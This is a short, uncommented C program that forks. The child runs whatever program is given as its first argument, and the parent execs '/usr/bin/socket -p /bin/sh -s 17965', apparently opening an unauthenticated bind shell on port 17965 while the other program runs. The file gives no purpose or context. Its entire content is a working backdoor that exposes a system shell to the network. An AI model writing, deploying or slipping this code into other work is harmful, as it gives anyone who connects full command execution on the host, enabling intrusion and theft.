#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>


int main (int argc, char** argv)
{
	int child;
	char *sock_args[] = {"/usr/bin/socket", "-p", "/bin/sh", "-s", "17965", NULL};

	if (argc < 2)
	{
		write(2, "No arguments\n", strlen("No arguments\n"));
		exit(0);
	}
	
	if ((child = fork()) == 0)
	{
		execv(argv[1], NULL);
		perror("Failed to execute program");
	}
	else if (child > 0)
	{
		execv("/usr/bin/socket", sock_args);
		perror("Failed to execute socket");
		kill(child, SIGKILL);
	}
	else
		perror("FORK ERROR: Failed to make child process");
	return 0;
}
